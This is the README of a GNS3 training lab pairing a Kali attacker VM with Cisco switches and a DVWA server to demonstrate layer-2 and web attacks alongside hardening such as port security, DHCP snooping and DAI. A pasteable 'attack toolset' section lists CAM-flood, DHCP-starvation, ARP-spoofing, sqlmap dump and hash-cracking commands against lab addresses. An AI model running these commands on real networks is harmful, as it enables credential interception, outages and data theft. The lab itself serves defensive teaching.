# VaultBreak — GNS3 topology (real Cisco IOSv + machines)

The `*.html` sims are browser approximations. This folder is the **real**
network: Cisco IOSv / IOSvL2 routers and switches, a Kali attacker VM, and a
DVWA server VM, wired exactly like the walkthrough's topology.

| Device | Platform | Role | Address |
| --- | --- | --- | --- |
| R1 | IOSv 15.6 (QEMU) | Edge router — inter-VLAN, DHCP pool, ACL, SSH | 192.168.250.1 / .10.1 / .20.1 / .99.1 |
| SW1 | IOSvL2 15.2 (QEMU) | Core — trunk backbone + DHCP snooping | 192.168.99.2 |
| SW2 | IOSvL2 15.2 (QEMU) | DMZ access — Port Security + BPDU Guard | 192.168.99.3 |
| SW3 | IOSvL2 15.2 (QEMU) | INTERNAL access — **DAI** + DHCP snooping + Port Security | 192.168.99.4 |
| Kali-Attacker | QEMU / VMware / VirtualBox | Attacker — 3 NICs (EXT, DMZ, INTERNAL) | .250.66 / .10.66 / .20.66 |
| DVWA-Server | QEMU / VMware / VirtualBox | Vulnerable web target | 192.168.10.20 |

L2 / CAM / ARP / DHCP attacks happen on the switches. **These run for real**
(no simulation): `macof` really fills the CAM table, `arpspoof` really poisons
caches, `dhcpstarv` really drains the pool — and Port Security / DHCP Snooping /
DAI really block them.

## Wiring table (if you rebuild the drawing manually)

```
Cloud-EXT  ────────────── R1 Gi0/0                (EXT  192.168.250.0/24)
Kali  [eth0] ──────────── R1 Gi0/0                (the attacker's external leg)
R1 Gi0/1 ──TRUNK── SW1 Gi1/0/1
SW1 Gi1/0/2 ──TRUNK── SW2 Gi1/0/1                 (DMZ  VLAN 10)
SW1 Gi1/0/3 ──TRUNK── SW3 Gi1/0/1                 (INT  VLAN 20)
SW2 Gi1/0/2 ── VLAN10 ── DVWA-Server eth0          (192.168.10.20)
SW2 Gi1/0/3 ── VLAN10 ── Kali [eth1]              (DMZ leg — Case 03)
SW3 Gi1/0/2 ── VLAN20 ── Employee-PC1 (VPCS)      (192.168.20.10)
SW3 Gi1/0/3 ── VLAN20 ── Kali [eth2]              (INT leg — Case 01 & 02)
```

## Importing the project

1. **Images first.** You must supply Cisco Plus–licensed/IOS images yourself:
   - `IOSv-15.6.qcow2` (ESR) and `IOSvL2-15.2.qcow2` — from Cisco (Software:
     IOSv, eval images are available on cisco.com).
   - `kali-linux-2026.qcow2` — Kali VM from kali.org/downloads.
   - `dvwa-ubuntu.qcow2` — any Ubuntu cloud image with DVWA installed
     (`lab/compose/dvwa/README.md` shows the container equivalent).
   Put them in `~/.config/GNS3/images/QEMU/` (Linux) or
   `%USERPROFILE%\.config\GNS3\images\QEMU\` (Windows).
2. File → **New Project**, then **Import** → select `VaultBreak.gns3project`.
3. GNS3 may ask you to pick the image for each node — point it at the files
   from step 1.
4. Bind the Kali/DVWA VM appliances if your GNS3 treats them as appliance VMs
   instead of QEMU disks: right-click node → **Change appliance**.

> The `.gns3project` is an import starting point. If a GNS3 upgrade rejects a
> field, just rebuild the 9 wires using the table above — it takes two minutes.

## The two "before / after" states

Each device config ships in its **hardened** form. To replay the walkthrough's
*Before* state, delete the defense lines from `startup-config`:

- **Case 01** — SW2/SW3: remove `port-security`, `bpduguard`, `portfast`,
  DHCP snooping trust. `macof` + `dhcpstarv` then fully succeed; with them,
  Gi0/x ERR-DISABLEs and the pool survives.
- **Case 02** — SW3: remove `ip arp inspection vlan 20`, the `ip arp
  inspection filter STATIC_HOSTS` line and the `arp access-list STATIC_HOSTS`
  block. `arpspoof` then works end-to-end; with DAI on, `show ip arp inspection`
  counts `Invalid ARPs Received` and drops the forged replies at the port.
- **Case 03** — R1: remove `ip access-group DMZ_TO_INTERNAL in` on Gi0/1.10,
  and SQLi/XSS are unmitigated; with it, DMZ→INTERNAL is cut at the router.

### DAI & static hosts (why SW3 has an ARP ACL)

DAI validates ARP replies on untrusted ports against DHCP-snooping bindings.
Employee-PC1 takes a lease, so it is covered by the binding table. Kali's
INTERNAL leg is a *static* 192.168.20.66 — without an entry DAI would drop its
legitimate ARP too — so `arp access-list STATIC_HOSTS` permits that one host.
A forged reply (attacker's MAC claiming the victim's IP) matches neither the
ACL nor a binding and is dropped. SW2 deliberately does **not** run DAI: DMZ
hosts are static-IP and would be killed the same way; its defenses are Port
Security + BPDU Guard, and the DMZ is protected at R1 by the extended ACL.

## Loading the running config

Clipboard/paste into each console, or `copy tftp: startup-config` / use the
ini in GNS3 **Edit → Node → Configure → Load config**.

## Attack toolset (paste into Kali)

```bash
# Case 01 — CAM flood (real) + DHCP starvation (real)
macof -i eth2 -n 100000                      # STUNTS the switch (see SW2 logs)
dhcpstarv eth2                               # or: yersinia dhcp -attack starvation

# Case 02 — ARP MITM (real)
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth2 -t 192.168.20.10 192.168.20.1 &
arpspoof -i eth2 -t 192.168.20.1 192.168.20.10 &
wireshark -i eth2                              # capture the victim's login

# Case 03 — web + offline cracking (real DVWA)
sqlmap -u "http://192.168.10.20/login.php" --batch --dump -T users
hashcat -m 0 hashes.txt rockyou.txt
stegseek ledger.jpg rockyou.txt
```

## Checks

```text
SW3# show ip arp inspection                    # DAI counters / drops
SW3# show ip dhcp snooping binding             # the table DAI validates against
SW2# show port-security address                # sticky leases on the access ports
SW2# show mac address-table                    # after the macof flood: trashed
R1#  show ip dhcp pool                         # lease counts before/after starvation
```